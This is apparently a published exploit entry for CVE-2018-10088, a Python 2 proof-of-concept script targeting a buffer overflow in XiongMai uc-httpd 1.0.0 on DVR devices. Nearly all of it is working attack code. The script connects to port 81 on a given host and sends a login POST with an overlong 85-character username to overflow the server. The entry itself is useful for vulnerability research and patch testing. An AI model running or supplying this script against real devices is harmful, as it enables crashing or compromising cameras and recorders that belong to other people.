# Exploit Title: XiongMai uc-httpd 1.0.0 - Buffer Overflow
# Date: 2018-06-08           
# Exploit Author: Andrew Watson
# Software Version: XiongMai uc-httpd 1.0.0
# Vendor Homepage: http://www.xiongmaitech.com/en/
# Tested on: KKMoon DVR running XiongMai uc-httpd 1.0.0 on TCP/81
# CVE ID: CVE-2018-10088
# DISCLAIMER: This proof of concept is provided for educational purposes only!
 
#!/usr/bin/python
 
import socket
import sys
 
payload="A" * 85
 
print "\n###############################################"
print "XiongMai uc-httpd 1.0.0 Buffer Overflow Exploit"
 
if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <Host>\n"
    sys.exit()
 
print "\nTarget: " + sys.argv[1]
print "Sending exploit..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],81))
s.send('POST /login.htm HTTP/1.1\r\n')
s.send('command=login&username=' + payload + '&password=PoC\r\n\r\n')
s.recv(1024)
s.close()
print "\nExploit complete!"